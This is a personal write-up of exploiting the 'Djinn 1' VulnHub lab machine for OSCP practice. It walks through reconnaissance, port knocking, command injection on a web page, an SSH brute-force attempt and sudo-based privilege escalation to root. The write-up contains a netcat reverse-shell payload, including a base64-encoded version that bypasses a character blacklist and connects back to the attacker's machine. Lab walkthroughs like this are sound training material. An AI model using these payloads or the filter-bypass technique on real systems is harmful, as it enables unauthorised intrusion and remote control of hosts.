# OSCP Prep - *Djinn 1*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/djinn-1,397/) and set it up with VMWare Workstation Pro 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance Part 1

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
$ sudo nmap -sS -sV -sC -PA -A -T4 -v -Pn -n -f --version-all --osscan-guess -p 21,22,1337,7331 192.168.159.168
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-30 23:38 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 23:38
Completed NSE at 23:38, 0.00s elapsed
Initiating NSE at 23:38
Completed NSE at 23:38, 0.00s elapsed
Initiating NSE at 23:38
Completed NSE at 23:38, 0.00s elapsed
Initiating ARP Ping Scan at 23:38
Scanning 192.168.159.168 [1 port]
Completed ARP Ping Scan at 23:38, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:38
Scanning 192.168.159.168 [4 ports]
Discovered open port 21/tcp on 192.168.159.168
Discovered open port 7331/tcp on 192.168.159.168
Discovered open port 1337/tcp on 192.168.159.168
Completed SYN Stealth Scan at 23:38, 0.04s elapsed (4 total ports)
Initiating Service scan at 23:38
Scanning 3 services on 192.168.159.168
Completed Service scan at 23:43, 261.68s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.159.168
NSE: Script scanning 192.168.159.168.
Initiating NSE at 23:43
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 23:43, 0.18s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 1.06s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Nmap scan report for 192.168.159.168
Host is up (0.00040s latency).

PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.159.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   filtered ssh
1337/tcp open     waste?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|     '/', 7)
|   RPCCheck: 
|     ____ _____ _ 
|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
|     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
|     Let's see how good you are with simple maths
|     Answer my questions 1000 times and I'll give you your gift.
|_    '/', 4)
7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
|_http-title: Lost in space
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.92%I=9%D=9/30%Time=6337B659%P=x86_64-pc-linux-gnu%r(NU
SF:LL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\
SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20
SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x
SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\
SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\
SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths
SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20
SF:you\x20your\x20gift\.\n\(8,\x20'/',\x207\)\n>\x20")%r(RPCCheck,1BC,"\x2
SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x
SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x
SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_\x
SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\x2
SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|
SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20
SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_
SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\x2
SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2
SF:0my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20your
SF:\x20gift\.\n\(4,\x20'/',\x204\)\n>\x20");
MAC Address: 00:0C:29:28:97:9A (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 27.564 days (since Sat Sep  3 10:11:19 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Unix

TRACEROUTE
HOP RTT     ADDRESS
1   0.40 ms 192.168.159.168

NSE: Script Post-scanning.
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Initiating NSE at 23:43
Completed NSE at 23:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 265.04 seconds
           Raw packets sent: 27 (1.982KB) | Rcvd: 19 (1.482KB)
```

There are four ports detected, but scanning the SSH port returns as ```filtered```. 

Based on previous experiences, this is a good indicator that there is likely some kind of port knocking.

As for everything else, FTP allows Anonymous authentication, so we can take a look at what's in there.

Scanning port 7331 shows an http service, meaning there's probably a webserver running on that port.

A nikto scan on port 7331 doesn't reveal much though.

```
$ sudo nikto --host http://192.168.159.168:7331                       
[sudo] password for meowmycks: 
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.159.168
+ Target Hostname:    192.168.159.168
+ Target Port:        7331
+ Start Time:         2022-09-30 23:39:56 (GMT-4)
---------------------------------------------------------------------------
+ Server: Werkzeug/0.16.0 Python/2.7.15+
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, OPTIONS, GET 
+ 7907 requests: 12 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-09-30 23:40:22 (GMT-4) (26 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Moving on to the FTP server, we find three files.

```
$ sudo ftp anonymous@192.168.159.168
Connected to 192.168.159.168.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||10486|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
226 Directory send OK.
```

Downloading and reading out each one reveals the following information:

```
$ cat creds.txt                                         
nitu:81299
                                                                                                                    
$ cat game.txt 
oh and I forgot to tell you I've setup a game for you on port 1337. See if you can reach to the 
final level and get the prize.
                                                                                                                    
$ cat message.txt 
@nitish81299 I am going on holidays for few days, please take care of all the work. 
And don't mess up anything.
```

## Step 2 - Exploitation Part 1

I opened a netcat connection to port 1337 to see what the "game" was.

```
$ nc 192.168.159.168 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(3, '/', 4)
> 0
(5, '-', 2)
> 3
(9, '+', 9)
> 
```

We have to answer 1000 arithmetic problems to get some kind of prize? Yikes.

How about we automate that process?

Using Python, I created a script that scrapes the window for information and substrings out the arithmetic problem. 
Once it's found, the script puts both of the numbers and the operator in a list.
The script then solves the problem by taking each element and reconstructing the problem.
The solution is then returned to the window, and the next arithmetic problem is scraped from the window in the same fashion.

```
!/usr/bin/env python3

from pwn import *
import sys

host, port = '192.168.159.168', 1337

s = remote(host, port, level='error')

operators = { 
        '+': lambda x,y: x+y,
        '-': lambda x,y: x-y,
        '*': lambda x,y: x*y,
        '/': lambda x,y: x/y 
}
 
def substringExpression(msg):
        msg = msg.decode()
        msg = msg.replace('(','')
        msg = msg.replace(')','')
        msg = msg.replace("'","")
        msg = msg.split(', ')
        return msg

def evaluateExpression(num1, op, num2):
        num1, num2 = int(num1), int(num2)
        return int(operators[op](num1, num2))


msg = s.recvuntil('> ')

while b'(' in msg and b')' in msg:   
        problem = substringExpression(msg[-14:-3])
        solution = str(evaluateExpression(problem[0], problem[1], problem[2]))
        s.sendline(solution.encode())

        print((' '.join(problem)), ' = ', solution)

        try:
                msg = s.recvuntil('> ')
        except:
                print("All solved!\n")
                break

msg = s.recv()
print(msg)
```

After much trial and error, I got a working cheat.

```
$ python3 djinn1game.py
/home/meowmycks/djinn1/djinn1game.py:31: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  msg = s.recvuntil('> ')
1 )  2 + 3  =  5
/home/meowmycks/djinn1/djinn1game.py:43: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  msg = s.recvuntil('> ')
2 )  8 - 8  =  0
3 )  6 * 8  =  48
4 )  3 - 3  =  0
5 )  4 / 8  =  0
6 )  2 - 2  =  0
7 )  7 / 4  =  1
8 )  6 / 5  =  1
9 )  8 + 8  =  16
10 )  6 + 8  =  14
11 )  8 / 9  =  0
12 )  3 / 4  =  0
13 )  7 + 5  =  12
14 )  5 + 4  =  9
15 )  4 * 1  =  4
16 )  5 + 4  =  9
17 )  9 + 5  =  14
...
...
```

And finally...

```
998 )  2 - 1  =  1
999 )  3 * 1  =  3
1000 )  3 / 8  =  0
All solved!

b'Here is your gift, I hope you know what to do with it:\n\n1356, 6784, 3409\n\n'
```

## Step 3 - Reconnaissance Part 2

It looks like those are three port numbers, which partially confirms my prediction of there being port knocking.

To know for certain, I tried running a nmap scan on those ports.

```
$ nmap -p 1356,6784,3409 192.168.159.168 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 00:01 EDT
Nmap scan report for 192.168.159.168
Host is up (0.00041s latency).

PORT     STATE  SERVICE
1356/tcp closed cuillamartin
3409/tcp closed networklens
6784/tcp closed bfd-lag

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

And I then re-scanned the SSH port.

```
$ sudo nmap -sS -p 22 192.168.159.168   
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 00:01 EDT
Nmap scan report for 192.168.159.168
Host is up (0.00031s latency).

PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 00:0C:29:28:97:9A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Nice.

I ran Hydra on SSH for ```nitu``` with ```darkweb2017-top1000.txt``` but I didn't get any hits.

```
$ sudo hydra -I -l nitu -P seclists/Passwords/darkweb2017-top1000.txt 192.168.159.168 ssh
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-01 00:02:46
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 999 login tries (l:1/p:999), ~63 tries per task
[DATA] attacking ssh://192.168.159.168:22/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 845 to do in 00:06h, 14 active
[STATUS] 116.00 tries/min, 348 tries in 00:03h, 653 to do in 00:06h, 14 active
[STATUS] 102.29 tries/min, 716 tries in 00:07h, 285 to do in 00:03h, 14 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-01 00:12:41
```

In the meantime, I moved on to the web server.

A gobuster scan revealed two pages, ```wish``` and ```genie```.

```
$ sudo gobuster fuzz -u http://192.168.159.168:7331/FUZZ -w seclists/Discovery/Web-Content/raft-large-words.txt -b 404,403,400 -k --exclude-length 0
[sudo] password for meowmycks: 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.159.168:7331/FUZZ
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                seclists/Discovery/Web-Content/raft-large-words.txt
[+] Excluded Status codes:   400,403,404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/30 23:40:39 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=385] http://192.168.159.168:7331/wish
Found: [Status=200] [Length=1676] http://192.168.159.168:7331/genie
                                                                   
===============================================================
2022/09/30 23:43:12 Finished
===============================================================
```

Going to ```wish``` revealed what looked like a page to perform command injection.

![image](https://user-images.githubusercontent.com/45502375/196001043-89195a13-cded-4642-a220-58b5c622b347.png)

To verify this, I typed ```whoami``` and hit Submit.

This brought me to the ```genie``` page and I saw the words ```www-data```, confirming my prediction.

![image](https://user-images.githubusercontent.com/45502375/196001138-936f70ee-71a9-416c-a4f8-d4f2873ffdd3.png)

## Step 4 - Exploitation Part 2

Using msfvenom, I generated a netcat reverse shell payload and tried to submit it.

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=192.168.159.128 lport=4444 R 
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 97 bytes
mkfifo /tmp/ymljs; nc 192.168.159.128 4444 0</tmp/ymljs | /bin/sh >/tmp/ymljs 2>&1; rm /tmp/ymljs
```

However, this didn't work, as I was told by the server that I had used the "Wrong choice of words".

Therefore, this probably meant there was a blacklist looking for special characters.

To bypass this, I tried base64 encoding my payload and then piping a decode.

The final payload was the following:

```
echo bWtmaWZvIC90bXAveW1sanM7IG5jIDE5Mi4xNjguMTU5LjEyOCA0NDQ0IDA8L3RtcC95bWxqcyB8IC9iaW4vc2ggPi90bXAveW1sanMgMj4mMTsgcm0gL3RtcC95bWxqcw== | base64 -d | bash
```

Running it on my machine showed that the command worked, at least on my own machine.

```
$ echo bWtmaWZvIC90bXAveW1sanM7IG5jIDE5Mi4xNjguMTU5LjEyOCA0NDQ0IDA8L3RtcC95bWxqcyB8IC9iaW4vc2ggPi90bXAveW1sanMgMj4mMTsgcm0gL3RtcC95bWxqcw== | base64 -d | bash 
(UNKNOWN) [192.168.159.128] 4444 (?) : Connection refused
```

So I opened a netcat listener on my machine...

```
$ sudo nc -lvnp 4444                                                                                                                                         
listening on [any] 4444 ...
```

...and tried to submit the payload to the web server...

![image](https://user-images.githubusercontent.com/45502375/196001462-5afcadf5-cc63-49dd-a806-6692dcf8c660.png)

...and I got a connection.

```
connect to [192.168.159.128] from (UNKNOWN) [192.168.159.168] 42674
whoami
www-data
```

## Step 5 - Privilege Escalation Part 1

Now that I had a foothold in the server, I could focus on upgrading to root.

I looked through the ```home``` folder to see what accounts existed.

```
www-data@djinn:/home$ ls
ls
nitish  sam
```

Looking through ```nitish```, I found a ```user.txt``` file and a ```creds.txt``` file in the ```.dev``` folder, which had login credentials for ```nitish```.

```
www-data@djinn:/home$ cd nitish
cd nitish
www-data@djinn:/home/nitish$ ls
ls
user.txt
www-data@djinn:/home/nitish$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
www-data@djinn:/home/nitish$ cd .ssh
cd .ssh
bash: cd: .ssh: No such file or directory
www-data@djinn:/home/nitish$ ls -la
ls -la
total 32
drwxr-xr-x 5 nitish nitish 4096 Nov 12  2019 .
drwxr-xr-x 4 root   root   4096 Nov 14  2019 ..
-rw------- 1 root   root    130 Nov 12  2019 .bash_history
-rw-r--r-- 1 nitish nitish 3771 Nov 11  2019 .bashrc
drwx------ 2 nitish nitish 4096 Nov 11  2019 .cache
drwxr-xr-x 2 nitish nitish 4096 Oct 21  2019 .dev
drwx------ 3 nitish nitish 4096 Nov 11  2019 .gnupg
-rw-r----- 1 nitish nitish   33 Nov 12  2019 user.txt
www-data@djinn:/home/nitish$ cd .dev
cd .dev
www-data@djinn:/home/nitish/.dev$ ls
ls
creds.txt
www-data@djinn:/home/nitish/.dev$ cat creds.txt
cat creds.txt
nitish:p4ssw0rdStr3r0n9
```

Having those credentials, I successfully logged in via SSH into ```nitish```.

```
$ ssh nitish@192.168.159.168
nitish@192.168.159.168's password: 

Last login: Sat Oct  1 09:47:18 2022 from 192.168.159.128
nitish@djinn:~$
```

And now we had the user flag.

```
nitish@djinn:~$ cat user.txt
10aay8289ptgguy1pvfa73alzusyyx3c
```

## Step 6 - Privilege Escalation Part 2

I started an HTTP server on my machine, allowing me to download my scripts from the target machine using ```wget``` requests.

```
$ sudo python3 -m http.server 80                                      
[sudo] password for meowmycks: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.

LSE allows me to scan the host for common privilege escalation points and some additional known vulnerabilities.

Kali:
```
192.168.8.91 - - [15/Oct/2022 09:41:47] "GET /lse.tar HTTP/1.1" 200 -
```
Target:
```
www-data@djinn:/var/www$ wget http://192.168.8.199/lse.tar
--2022-10-15 19:11:47--  http://192.168.8.199/lse.tar
Connecting to 192.168.8.199:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12820480 (12M) [application/x-tar]
Saving to: 'lse.tar'

lse.tar             100%[===================>]  12.23M  --.-KB/s    in 0.07s   

2022-10-15 19:11:47 (171 MB/s) - 'lse.tar' saved [12820480/12820480]
```

Running LSE shows that we can run some binary called ```genie``` without a password as ```sam```.

```
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for nitish on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie
---
...
```

This is a user-created binary, so we can only mess with it to learn how it works.

Eventually, running the command ```sudo -u sam genie -cmd new``` makes us the ```sam``` user.

```
nitish@djinn:~$ sudo -u sam genie -cmd new
my man!!
$ whoami
sam
$ 
```

## Step 7 - Privilege Escalation Part 3

Running LSE again as ```sam```, we find another binary we can run as root using sudo without a password.

```
[!] sud010 Can we list sudo commands without a password?................... yes!
---
Matching Defaults entries for sam on djinn:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
---
```

Messing with this binary (for an annoyingly long time...), we eventually get a working set of commands to get a privilege escalation to root.

```
$ sudo -u root /root/lago
What do you want to do ?
1 - Be naughty
2 - Guess the number
3 - Read some damn files
4 - Work
Enter your choice:2
Choose a number between 1 to 100: 
Enter your number: num
# whoami
root
```

Now that we're root, we can go to the ```root``` folder and get the flag.

The flag is a script called ```proof.sh```, so we run it.

```
# cd /root
# ls    
lago  proof.sh
# ./proof.sh
    _                        _             _ _ _ 
   / \   _ __ ___   __ _ ___(_)_ __   __ _| | | |
  / _ \ | '_ ` _ \ / _` |_  / | '_ \ / _` | | | |
 / ___ \| | | | | | (_| |/ /| | | | | (_| |_|_|_|
/_/   \_\_| |_| |_|\__,_/___|_|_| |_|\__, (_|_|_)
                                     |___/       
djinn pwned...
__________________________________________________________________________

Proof: 33eur2wjdmq80z47nyy4fx54bnlg3ibc
Path: /root
Date: Sat Oct 15 23:58:37 IST 2022
Whoami: root
__________________________________________________________________________

By @0xmzfr

Thanks to my fellow teammates in @m0tl3ycr3w for betatesting! :-)
```

## Conclusion

Command injection is fun, especially when it's found this easily.

That "game" was also fun to mess with, since it helped me reinforce my Python skills when coding a cheat for it and provided me with so much satisfaction when I got it working and saw those math problems being solved one by one.

This box was much more complicated, since I had to go through four different accounts before I was the root user, making it all the more satisfying.

Hyped for the next one as always.
